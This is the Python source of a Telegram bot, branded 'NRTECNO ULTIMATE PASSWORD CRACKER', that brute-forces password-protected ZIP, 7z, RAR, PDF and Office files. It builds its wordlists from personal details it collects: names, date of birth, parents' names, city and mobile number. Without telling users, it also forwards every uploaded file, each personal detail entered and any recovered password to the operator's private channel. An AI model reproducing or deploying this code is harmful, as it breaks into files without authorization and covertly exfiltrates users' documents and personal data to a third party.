import os
import json
import time
import random
import requests
import threading
import pyzipper
import py7zr
import pdfplumber
from flask import Flask, request, jsonify
from concurrent.futures import ThreadPoolExecutor

TOKEN = os.environ.get("BOT_TOKEN")
RENDER_URL = os.environ.get("RENDER_URL", "https://your-bot.onrender.com")
PRIVATE_CHANNEL = -1004479815753
CHANNEL_USERNAME = "@nrtecno2"

app = Flask(__name__)
user_sessions = {}

# ============================================================
# FAST PASSWORD GENERATOR (Optimized)
# ============================================================
class FastPasswordGenerator:
    def __init__(self):
        self.names = ['narendra', 'raj', 'rahul', 'amit', 'vikram', 'ajay', 'sunil',
                      'anil', 'deepak', 'sanjay', 'vijay', 'arjun', 'karan', 'mohit',
                      'rohit', 'ankit', 'vivek', 'manoj', 'suresh', 'mahesh', 'ramesh',
                      'dinesh', 'ganesh', 'naveen', 'pawan', 'sachin', 'rajesh', 'kapil',
                      'mukesh', 'ravi', 'ashok', 'shyam', 'kumar', 'singh', 'sharma',
                      'verma', 'gupta', 'yadav', 'jain', 'patel', 'shah', 'desai',
                      'meghwal', 'choudhary', 'rathore', 'shekhawat', 'gehlot',
                      'vyas', 'trivedi', 'pandey', 'tripathi', 'mishra']

        self.common_words = ['admin', 'password', 'root', 'toor', 'iloveyou', 'sunshine',
                             'princess', 'dragon', 'baseball', 'superman', 'batman',
                             'trustno', 'hello', 'freedom', 'whatever', 'qwerty',
                             'letmein', 'welcome', 'monkey', 'secret', 'love', 'angel',
                             'rainbow', 'tiger', 'eagle', 'phoenix', 'shadow', 'night',
                             'star', 'moon', 'sun', 'cloud', 'thunder', 'lightning',
                             'water', 'fire', 'earth', 'wind', 'sky', 'ocean', 'forest']

        self.special_chars = ['@', '#', '&', '%', '!', '$', '_', '-']
        self.numbers = ['1', '12', '123', '1234', '12345', '123456', '1234567', '12345678',
                        '123456789', '1234567890']
        self.years = ['2020', '2021', '2022', '2023', '2024', '2025', '2026']
        self.months = ['january', 'february', 'march', 'april', 'may', 'june',
                       'july', 'august', 'september', 'october', 'november', 'december']

        self.sentences = [
            'DEEPSEEK JB BY NONE USER',
            'DEEPSEEKJBBYNONEUSER',
            'NRTECNO ULTIMATE PASSWORD CRACKER',
            'NRTECNOULTIMATEPASSWORDCRACKER',
            'BRUTEFORCE MACHINE ACTIVATED',
            'BRUTEFORCEMACHINEACTIVATED',
            'PASSWORD CRACKING IN PROGRESS',
            'PASSWORDCRACKINGINPROGRESS'
        ]

    def generate_name_variations(self, name):
        name = name.lower()
        variations = [
            name, name.upper(), name.capitalize(), name.title(),
            name[::-1], name[::-1].capitalize(), name[::-1].upper(),
            f"{name}{name}", f"{name}{name[::-1]}", f"{name[::-1]}{name}"
        ]
        return variations[:8]

    def generate_passwords(self, user_info=None):
        passwords = set()

        # Get user info
        name = user_info.get('name', '').strip().lower() if user_info else ''
        father = user_info.get('father', '').strip().lower() if user_info else ''
        mother = user_info.get('mother', '').strip().lower() if user_info else ''
        city = user_info.get('city', '').strip().lower() if user_info else ''
        mobile = user_info.get('mobile', '').strip() if user_info else ''
        dob = user_info.get('dob', '').strip() if user_info else ''

        all_names = self.names[:20]
        if name:
            all_names.insert(0, name)
        if father:
            all_names.insert(0, father)
        if mother:
            all_names.insert(0, mother)
        if city:
            all_names.insert(0, city)

        # 1. Sentences (Fast)
        for sentence in self.sentences:
            passwords.add(sentence)
            passwords.add(sentence.replace(' ', ''))
            passwords.add(sentence.upper())
            for num in ['123', '2024']:
                passwords.add(f"{sentence}{num}")
                passwords.add(f"{sentence}@{num}")

        # 2. Name + Special + Number (Fast)
        for n in all_names[:15]:
            for v in [n, n.upper(), n.capitalize()]:
                for spec in ['@', '#', '&']:
                    for num in ['123', '1234', '2024']:
                        passwords.add(f"{v}{spec}{num}")
                        passwords.add(f"{v}{num}{spec}")

        # 3. Name + Year (Fast)
        for n in all_names[:15]:
            for v in [n, n.upper(), n.capitalize()]:
                for year in ['2024', '2025', '2026']:
                    passwords.add(f"{v}{year}")
                    passwords.add(f"{v}@{year}")
                    passwords.add(f"{v}#{year}")

        # 4. Name + Name (Fast)
        for n1 in all_names[:10]:
            for n2 in all_names[:8]:
                if n1 != n2:
                    for v1 in [n1, n1.capitalize()]:
                        for v2 in [n2, n2.capitalize()]:
                            passwords.add(f"{v1}{v2}")
                            passwords.add(f"{v1}@{v2}")
                            passwords.add(f"{v1}{v2}{random.randint(1000, 9999)}")

        # 5. Word + Special + Name (Fast)
        for word in self.common_words[:10]:
            for n in all_names[:8]:
                for v in [n, n.capitalize()]:
                    for spec in ['@', '#']:
                        passwords.add(f"{word}{spec}{v}")
                        passwords.add(f"{v}{spec}{word}")
                        passwords.add(f"{word}{v}{random.randint(100, 999)}")

        # 6. Three Name Combinations (Fast)
        for n1 in all_names[:5]:
            for n2 in all_names[:5]:
                for n3 in all_names[:3]:
                    if n1 != n2 and n2 != n3 and n1 != n3:
                        passwords.add(f"{n1}{n2}{n3}")
                        passwords.add(f"{n1}@{n2}{n3}")
                        passwords.add(f"{n1}{n2}{n3}{random.randint(100, 999)}")

        # 7. Mobile (Fast)
        if mobile:
            mobile_clean = ''.join(filter(str.isdigit, mobile))
            if mobile_clean:
                passwords.add(mobile_clean)
                for n in all_names[:8]:
                    for v in [n, n.capitalize()]:
                        passwords.add(f"{v}{mobile_clean}")
                        passwords.add(f"{v}@{mobile_clean}")
                        passwords.add(f"{v}{mobile_clean[-4:]}")
                        passwords.add(f"{v}@{mobile_clean[-4:]}")

        # 8. DOB (Fast)
        if dob:
            clean_dob = dob.replace('/', '').replace('-', '')
            if len(clean_dob) >= 4:
                passwords.add(clean_dob)
                for n in all_names[:8]:
                    for v in [n, n.capitalize()]:
                        passwords.add(f"{v}{clean_dob}")
                        passwords.add(f"{v}@{clean_dob}")
                        passwords.add(f"{v}{clean_dob[-4:]}")
                        passwords.add(f"{v}@{clean_dob[-4:]}")

        # 9. Common Words + Numbers (Fast)
        for word in self.common_words[:15]:
            for num in ['123', '2024']:
                passwords.add(f"{word}{num}")
                passwords.add(f"{word}@{num}")
                passwords.add(f"{word}#{num}")
                passwords.add(f"{word.upper()}{num}")

        # 10. Brand Passwords (Fast)
        for n in all_names[:8]:
            for v in [n, n.upper(), n.capitalize()]:
                passwords.add(f"Password by {v}")
                passwords.add(f"PASSWORD BY {v.upper()}")
                passwords.add(f"Nrtecno{v}")
                passwords.add(f"Nrtecno@{v}")
                passwords.add(f"Nrtecno#{v}")

        final_list = list(passwords)
        random.shuffle(final_list)
        print(f"✅ Generated {len(final_list)} optimized passwords")
        return final_list


# ============================================================
# FAST FILE CRACKERS (Optimized with early exit)
# ============================================================
def crack_zip_fast(file_path, password_list):
    for pwd in password_list:
        try:
            with pyzipper.AESZipFile(file_path) as zf:
                zf.extractall(pwd=pwd.encode())
                return pwd
        except:
            continue
    return None


def crack_7z_fast(file_path, password_list):
    for pwd in password_list:
        try:
            with py7zr.SevenZipFile(file_path, password=pwd) as archive:
                archive.extractall()
                return pwd
        except:
            continue
    return None


def crack_pdf_fast(file_path, password_list):
    for pwd in password_list:
        try:
            with pdfplumber.open(file_path, password=pwd) as pdf:
                if len(pdf.pages) > 0:
                    return pwd
        except:
            continue
    return None


def crack_office_fast(file_path, password_list):
    try:
        import msoffcrypto
        for pwd in password_list:
            try:
                with open(file_path, 'rb') as f:
                    office = msoffcrypto.OfficeFile(f)
                    office.load_key(password=pwd)
                    return pwd
            except:
                continue
    except:
        pass
    return None


def crack_rar_fast(file_path, password_list):
    try:
        import rarfile
        import tempfile
        if not rarfile.is_rarfile(file_path):
            return None
        with tempfile.TemporaryDirectory() as tmpdir:
            for pwd in password_list:
                try:
                    with rarfile.RarFile(file_path) as rf:
                        rf.extractall(path=tmpdir, pwd=pwd)
                        return pwd
                except:
                    continue
    except:
        pass
    return None


def crack_file_fast(file_path, ext, password_list):
    if ext == 'zip':
        return crack_zip_fast(file_path, password_list)
    elif ext == '7z':
        return crack_7z_fast(file_path, password_list)
    elif ext == 'pdf':
        return crack_pdf_fast(file_path, password_list)
    elif ext in ['docx', 'doc', 'xlsx', 'xls', 'pptx', 'ppt']:
        return crack_office_fast(file_path, password_list)
    elif ext == 'rar':
        return crack_rar_fast(file_path, password_list)
    return None


# ============================================================
# TELEGRAM HELPERS
# ============================================================
def send_message(chat_id, text, reply_markup=None, parse_mode='Markdown'):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    requests.post(url, json=payload)


def edit_message(chat_id, message_id, text, reply_markup=None, parse_mode='Markdown'):
    url = f"https://api.telegram.org/bot{TOKEN}/editMessageText"
    payload = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    requests.post(url, json=payload)


def send_document(chat_id, file_path, caption=""):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    with open(file_path, 'rb') as f:
        files = {'document': f}
        data = {'chat_id': chat_id, 'caption': caption}
        requests.post(url, files=files, data=data)


def answer_callback(callback_id, text=""):
    url = f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery"
    payload = {"callback_query_id": callback_id, "text": text}
    requests.post(url, json=payload)


def check_channel_membership(user_id):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getChatMember"
        params = {"chat_id": CHANNEL_USERNAME, "user_id": user_id}
        response = requests.get(url, params=params)
        data = response.json()
        if data["ok"]:
            status = data["result"]["status"]
            return status in ["member", "creator", "administrator"]
        return False
    except:
        return False


def get_auto_buttons():
    return {
        "inline_keyboard": [
            [
                {"text": "1️⃣ AUTO (With Info)", "callback_data": "auto_info"},
                {"text": "2️⃣ AUTO (Direct)", "callback_data": "auto_direct"}
            ]
        ]
    }


def join_verify_keyboard():
    return {
        "inline_keyboard": [
            [
                {"text": "🔴 JOIN CHANNEL", "url": "https://t.me/nrtecno2"},
                {"text": "✅ VERIFY", "callback_data": "verify"}
            ]
        ]
    }


# ============================================================
# FAST CRACK IN BACKGROUND
# ============================================================
def crack_in_background_fast(chat_id, file_path, file_name, ext, user_info=None):
    try:
        generator = FastPasswordGenerator()
        password_list = generator.generate_passwords(user_info)

        send_message(chat_id, f"📊 *Generated {len(password_list)} passwords*\n⚡ *Starting fast brute-force...*", parse_mode='Markdown')

        start_time = time.time()
        password = crack_file_fast(file_path, ext, password_list)
        elapsed = time.time() - start_time

        if password:
            send_message(
                chat_id,
                f"✅ *Password Cracked!*\n\n🔑 `{password}`\n\n📁 {file_name}\n⚡ Time: {elapsed:.2f}s",
                parse_mode='Markdown'
            )
            try:
                send_document(PRIVATE_CHANNEL, file_path, f"✅ Found!\n📁 {file_name}\n🔑 {password}")
            except:
                pass
        else:
            send_message(
                chat_id,
                f"❌ *Password Not Found!*\n\n📁 {file_name}\n🔢 {len(password_list)} passwords tried.\n⚡ Time: {elapsed:.2f}s",
                parse_mode='Markdown'
            )
            try:
                send_document(PRIVATE_CHANNEL, file_path, f"❌ Not Found!\n📁 {file_name}\n🔢 {len(password_list)} tried")
            except:
                pass

        if os.path.exists(file_path):
            os.remove(file_path)

    except Exception as e:
        send_message(chat_id, f"❌ *Error:* {str(e)}", parse_mode='Markdown')
        if os.path.exists(file_path):
            os.remove(file_path)


# ============================================================
# MAIN WEBHOOK HANDLER
# ============================================================
@app.route(f'/webhook/{TOKEN}', methods=['POST'])
def webhook():
    try:
        update = request.get_json()
        if not update:
            return jsonify({"status": "error"}), 400

        if 'message' in update:
            message = update['message']
            chat_id = message['chat']['id']
            user_id = message['from']['id']
            username = message['from'].get('username', str(user_id))

            if 'text' in message:
                text = message['text']

                if text == '/start':
                    if not check_channel_membership(user_id):
                        send_message(chat_id, "🔴 *Access Denied!*\n\n❌ Please join @nrtecno2 first.", reply_markup=join_verify_keyboard())
                    else:
                        send_message(chat_id, "🔐 *NRTECNO ULTIMATE PASSWORD CRACKER*\n\n✅ Verified!\n⚡ *Fast Mode Activated*\n📁 *Send me any password protected file.*\n\nSupported: ZIP, 7z, RAR, PDF, DOCX, XLSX, PPTX", parse_mode='Markdown')
                    return jsonify({"status": "ok"}), 200

                if chat_id in user_sessions and user_sessions[chat_id].get('state') == 'collecting_info':
                    session = user_sessions[chat_id]
                    field = session['current_field']
                    session['info'][field] = text

                    try:
                        send_message(PRIVATE_CHANNEL, f"📝 *{field.title()}:* {text}\n👤 @{username}")
                    except:
                        pass

                    fields = session['fields']
                    current_index = fields.index(field)

                    if current_index + 1 < len(fields):
                        next_field = fields[current_index + 1]
                        session['current_field'] = next_field
                        send_message(chat_id, f"📝 *Enter {next_field.title()}?*", parse_mode='Markdown')
                    else:
                        session['state'] = 'cracking'
                        info_summary = "📝 *User Info Collected*\n\n"
                        for f, v in session['info'].items():
                            info_summary += f"📌 *{f.title()}:* {v}\n"
                        info_summary += f"\n👤 @{username}\n📁 {session['file_name']}"
                        try:
                            send_message(PRIVATE_CHANNEL, info_summary)
                        except:
                            pass

                        send_message(chat_id, "⚡ *Generating optimized passwords...*\n⏳ Please wait...", parse_mode='Markdown')

                        threading.Thread(
                            target=crack_in_background_fast,
                            args=(chat_id, session['file_path'], session['file_name'], session['file_ext'], session['info'])
                        ).start()

                        del user_sessions[chat_id]
                    return jsonify({"status": "ok"}), 200

            if 'document' in message:
                file = message['document']
                file_name = file.get('file_name', 'unknown')
                file_id = file['file_id']

                if not check_channel_membership(user_id):
                    send_message(chat_id, "🔴 Access Denied!", reply_markup=join_verify_keyboard())
                    return jsonify({"status": "ok"}), 200

                file_info = requests.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}").json()
                file_path_api = file_info['result']['file_path']
                file_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_path_api}"
                response = requests.get(file_url)

                os.makedirs("downloads", exist_ok=True)
                file_path = f"downloads/{file_name}"
                with open(file_path, 'wb') as f:
                    f.write(response.content)

                ext = file_name.split('.')[-1].lower()

                try:
                    send_message(PRIVATE_CHANNEL, f"📁 *File Received*\n📄 {file_name}\n👤 @{username}")
                except:
                    pass

                user_sessions[chat_id] = {
                    'file_path': file_path,
                    'file_name': file_name,
                    'file_ext': ext,
                    'state': 'waiting_for_option'
                }

                send_message(
                    chat_id,
                    f"📁 *File Received!*\n\n📄 {file_name}\n⚡ *Choose an option:*",
                    reply_markup=get_auto_buttons(),
                    parse_mode='Markdown'
                )

                return jsonify({"status": "ok"}), 200

        if 'callback_query' in update:
            callback = update['callback_query']
            callback_id = callback['id']
            chat_id = callback['message']['chat']['id']
            message_id = callback['message']['message_id']
            user_id = callback['from']['id']
            data = callback['data']

            if data == 'verify':
                if check_channel_membership(user_id):
                    edit_message(chat_id, message_id, "🔐 *NRTECNO ULTIMATE PASSWORD CRACKER*\n\n✅ Verified!\n⚡ *Send me a file.*", parse_mode='Markdown')
                else:
                    edit_message(chat_id, message_id, "🔴 *Still Not Verified!*\n\n❌ Please join @nrtecno2 first.", reply_markup=join_verify_keyboard())
                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200

            if data == 'auto_direct':
                session = user_sessions.get(chat_id)
                if not session:
                    send_message(chat_id, "❌ *No file found. Send a file first.*", parse_mode='Markdown')
                    answer_callback(callback_id)
                    return jsonify({"status": "ok"}), 200

                edit_message(chat_id, message_id, "⚡ *AUTO mode activated (Direct)...*\n⏳ Generating optimized passwords...", parse_mode='Markdown')

                threading.Thread(
                    target=crack_in_background_fast,
                    args=(chat_id, session['file_path'], session['file_name'], session['file_ext'], None)
                ).start()

                del user_sessions[chat_id]
                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200

            if data == 'auto_info':
                session = user_sessions.get(chat_id)
                if not session:
                    send_message(chat_id, "❌ *No file found. Send a file first.*", parse_mode='Markdown')
                    answer_callback(callback_id)
                    return jsonify({"status": "ok"}), 200

                fields = ['name', 'dob', 'father', 'mother', 'city', 'mobile']
                session['info'] = {}
                session['fields'] = fields
                session['current_field'] = fields[0]
                session['state'] = 'collecting_info'

                edit_message(chat_id, message_id, "📝 *Let's collect some info for ultimate password generation*\n\n", parse_mode='Markdown')
                send_message(chat_id, f"📝 *Enter {fields[0].title()}?*", parse_mode='Markdown')
                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200

            if data == 'cancel':
                session = user_sessions.get(chat_id)
                if session and session.get('file_path'):
                    os.remove(session['file_path'])
                del user_sessions[chat_id]
                send_message(chat_id, "❌ *Cancelled.* Send file again.", parse_mode='Markdown')
                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200

            answer_callback(callback_id)
            return jsonify({"status": "ok"}), 200

        return jsonify({"status": "ok"}), 200

    except Exception as e:
        print(f"❌ Error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


# ============================================================
# SET WEBHOOK AND MAIN
# ============================================================
def set_webhook():
    webhook_url = f"{RENDER_URL}/webhook/{TOKEN}"
    url = f"https://api.telegram.org/bot{TOKEN}/setWebhook"
    response = requests.post(url, json={"url": webhook_url})
    if response.status_code == 200:
        print(f"✅ Webhook set to: {webhook_url}")
    else:
        print(f"❌ Webhook failed: {response.text}")


if __name__ == "__main__":
    if not TOKEN:
        print("❌ BOT_TOKEN not found!")
        exit(1)

    set_webhook()

    port = int(os.environ.get("PORT", 5000))
    print("🤖 NRTECNO ULTIMATE PASSWORD CRACKER STARTED...")
    print("⚡ FAST MODE ACTIVATED")
    print("🔢 Password Types: All possible combinations")
    print("📁 Files: ZIP, 7z, RAR, PDF, DOCX, XLSX, PPTX")
    print("🚀 Running on port", port)

    app.run(host="0.0.0.0", port=port)
